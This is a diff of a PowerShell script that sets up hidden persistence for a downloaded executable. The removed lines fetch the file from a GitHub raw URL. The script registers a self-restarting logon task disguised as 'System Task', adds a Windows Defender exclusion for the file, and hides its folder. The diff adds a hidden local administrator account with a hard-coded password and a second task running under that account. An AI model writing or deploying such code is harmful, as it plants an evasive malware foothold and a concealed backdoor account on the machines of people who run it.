@@ -1,7 +1,5 @@
 New-Item -ItemType Directory -Path C:\Users\Public\krnl
 
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/milujemnastenky/bombardini-gusini/main/apps/schvostkrnl-debug.exe" -OutFile "C:\Users\Public\krnl\schvostkrnl-debug.exe"
-
 Register-ScheduledTask -TaskName "WINschvostkrnl" -Action (New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c schvostkrnl-debug.exe > log.txt 2>&1" -WorkingDirectory "C:\Users\Public\krnl") -Trigger (New-ScheduledTaskTrigger -AtLogon) -Principal (New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -StartWhenAvailable -ExecutionTimeLimit 0 -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 5) -TaskPath "\" -Description "System Task" -Force
 
 Add-MpPreference -ExclusionPath "C:\Users\Public\krnl\schvostkrnl-debug.exe"
@@ -18,9 +16,10 @@ Set-ItemProperty -Path "C:\Users\Public\krnl\schvostkrnl-debug.exe" -Name Creati
 Set-ItemProperty -Path "C:\Users\Public\krnl" -Name Attributes -Value Hidden
 
 
-icacls "C:\Users\Public\krnl" /inheritance:e
-icacls "C:\Users\Public\krnl" /grant "Users:(OI)(CI)F"
-icacls "C:\Users\Public\krnl" /grant "Everyone:(OI)(CI)F"
-icacls "C:\Users\Public\krnl" /grant "SYSTEM:(OI)(CI)F" /T
-icacls "C:\Users\Public\krnl" /remove "Users"
-icacls "C:\Users\Public\krnl" /remove "Everyone"
+net user krnlrunner "StrongPassword123!" /add & net localgroup Administrators krnlrunner /add & reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v krnlrunner /t REG_DWORD /d 0 /f
+
+icacls "C:\Users\Public\krnl" /inheritance:r & icacls "C:\Users\Public\krnl" /remove "Users" & icacls "C:\Users\Public\krnl" /remove "Everyone" & icacls "C:\Users\Public\krnl" /grant:r "krnlrunner:(OI)(CI)F" "SYSTEM:(OI)(CI)F"
+
+runas /user:krnlrunner cmd
+
+Register-ScheduledTask -TaskName "WINschvostkrnl" -Action (New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start schvostkrnl-debug.exe" -WorkingDirectory "C:\Users\Public\krnl") -Trigger (New-ScheduledTaskTrigger -AtLogon) -Principal (New-ScheduledTaskPrincipal -UserId "krnlrunner" -LogonType Password -RunLevel Highest) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -StartWhenAvailable -ExecutionTimeLimit 0 -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 5) -TaskPath "\" -Description "System Task" -Force
